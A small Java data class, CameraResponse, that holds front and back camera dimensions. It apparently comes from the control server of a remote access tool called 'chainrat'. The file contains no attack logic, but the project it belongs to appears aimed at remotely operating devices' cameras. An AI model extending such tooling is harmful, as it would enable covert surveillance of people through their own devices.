package com.nefi.chainrat.server.network.ControlServer.packets;

import com.nefi.chainrat.server.network.ControlServer.CommandType;
import com.sun.glass.ui.Size;

public class CameraResponse{
    public Size[] dimensionsFront;
    public Size[] dimensionsBack;

    public CameraResponse( Size[] dimensionsFront,  Size[] dimensionsBack){
        this.dimensionsFront = dimensionsFront;
        this.dimensionsBack = dimensionsBack;
    }
}
